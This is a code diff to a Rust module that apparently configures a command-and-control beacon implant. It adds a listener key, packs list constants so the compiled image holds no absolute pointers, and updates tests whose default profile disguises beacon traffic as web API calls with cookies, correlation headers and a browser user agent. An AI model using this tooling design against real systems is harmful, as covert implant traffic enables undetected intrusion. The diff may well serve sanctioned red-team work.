@@ -58,14 +58,19 @@ pub struct OutputWrap {
 /// The generated constants, one build config per beacon. With SPT_CONFIG
 /// unset (dev, CI), the default config mirrors profiles/default.json.
 pub mod generated {
-    use super::{Encoding, MetadataTransport, OutputTransport, OutputWrap, Placement, Rotation};
+    use super::{Encoding, OutputTransport, Placement, Rotation};
     include!(concat!(env!("OUT_DIR"), "/config_gen.rs"));
 }
 
+// List constants are packed (data + offsets + accessor) so the image holds
+// no absolute fat pointers — see build/render.rs packed_list.
 pub use generated::{
-    AES_KEY, BEACON_ID_HEADER, GET_HEADERS, GET_METADATA, GET_SERVER_OUTPUT, GET_URIS, HOSTS,
-    JITTER_MS, KILL_EPOCH, POST_CLIENT_OUTPUT, POST_HEADERS, POST_METADATA, POST_SERVER_OUTPUT,
-    POST_URIS, ROTATION, SLEEP_MS, USER_AGENT, WATERMARK,
+    get_header, get_uri, host, post_header, post_uri, AES_KEY, BEACON_ID_HEADER, GET_HEADERS_COUNT,
+    GET_HEADERS_DATA, GET_METADATA_NAME, GET_SERVER_OUTPUT_APPEND, GET_SERVER_OUTPUT_PREPEND,
+    GET_URIS_COUNT, GET_URIS_DATA, HOSTS_COUNT, HOSTS_DATA, JITTER_MS, KILL_EPOCH, LISTENER_KEY,
+    POST_CLIENT_OUTPUT, POST_HEADERS_COUNT, POST_HEADERS_DATA, POST_METADATA_NAME,
+    POST_SERVER_OUTPUT_APPEND, POST_SERVER_OUTPUT_PREPEND, POST_URIS_COUNT, POST_URIS_DATA,
+    ROTATION, SLEEP_MS, USER_AGENT, WATERMARK,
 };
 
 #[cfg(test)]
@@ -78,24 +83,25 @@ mod tests {
     #[test]
     fn default_build_semantics() {
         assert_eq!(AES_KEY, [0u8; 32]);
+        assert_eq!(LISTENER_KEY, [0u8; 16]);
         assert_eq!(SLEEP_MS, 30000);
         assert_eq!(JITTER_MS, 2000);
         assert_eq!(WATERMARK, 0);
         assert_eq!(KILL_EPOCH, 0);
-        assert_eq!(HOSTS, ["localhost:443"]);
+        assert_eq!(HOSTS_COUNT, 1);
+        assert_eq!(host(0), "localhost:443");
         assert_eq!(ROTATION, Rotation::Sequential);
         assert_eq!(BEACON_ID_HEADER, "X-Request-Id");
         assert!(USER_AGENT.starts_with("Mozilla/5.0 ("));
-        assert_eq!(GET_URIS, ["/api/v1/status", "/api/v1/health"]);
-        assert_eq!(GET_METADATA.placement, Placement::Cookie);
-        assert_eq!(GET_METADATA.name, "session");
-        assert_eq!(GET_METADATA.format, Encoding::Base64Url);
-        assert_eq!(GET_SERVER_OUTPUT.placement, Placement::Body);
-        assert_eq!(GET_SERVER_OUTPUT.prepend, "{\"data\":\"");
-        assert_eq!(POST_METADATA.placement, Placement::Header);
-        assert_eq!(POST_METADATA.name, "X-Correlation-Id");
+        assert_eq!(GET_URIS_COUNT, 2);
+        assert_eq!(get_uri(0), "/api/v1/status");
+        assert_eq!(get_uri(1), "/api/v1/health");
+        assert_eq!(GET_METADATA_NAME, "session");
+        assert_eq!(GET_SERVER_OUTPUT_PREPEND, "{\"data\":\"");
+        assert_eq!(POST_METADATA_NAME, "X-Correlation-Id");
         assert_eq!(POST_CLIENT_OUTPUT.placement, Placement::Body);
-        assert_eq!(POST_SERVER_OUTPUT.append, "\"}");
+        assert_eq!(POST_SERVER_OUTPUT_PREPEND, "{\"result\":\"");
+        assert_eq!(POST_SERVER_OUTPUT_APPEND, "\"}");
     }
 
     #[test]
@@ -126,8 +132,9 @@ mod render_tests {
 
     fn config_with_profile(profile_json: &str) -> String {
         format!(
-            "{{\"aes_key\":\"{}\",\"sleep_ms\":1000,\"jitter_ms\":100,\"watermark\":42,\"kill_epoch\":0,\"profile\":{profile_json}}}",
-            "ab".repeat(32)
+            "{{\"aes_key\":\"{}\",\"listener_key\":\"{}\",\"sleep_ms\":1000,\"jitter_ms\":100,\"watermark\":42,\"kill_epoch\":0,\"profile\":{profile_json}}}",
+            "ab".repeat(32),
+            "cd".repeat(16)
         )
     }
 
@@ -184,6 +191,8 @@ mod render_tests {
         assert_eq!(model.kill_epoch, 1767225600);
         assert_eq!(model.aes_key[0], 0xab);
         assert_eq!(model.aes_key[31], 0xab);
+        assert_eq!(model.listener_key[0], 0xcd);
+        assert_eq!(model.listener_key[15], 0xcd);
     }
 
     // --- strict validation: a malformed config must fail the build ---
@@ -201,6 +210,13 @@ mod render_tests {
         let mut json = config_with_profile(&read_profile("default"));
         json = json.replace(&"ab".repeat(32), "abcd");
         expect_err(&json, "32 bytes");
+    }
+
+    #[test]
+    fn rejects_wrong_listener_key_length() {
+        let mut json = config_with_profile(&read_profile("default"));
+        json = json.replace(&"cd".repeat(16), "cdef");
+        expect_err(&json, "16 bytes");
     }
 
     #[test]
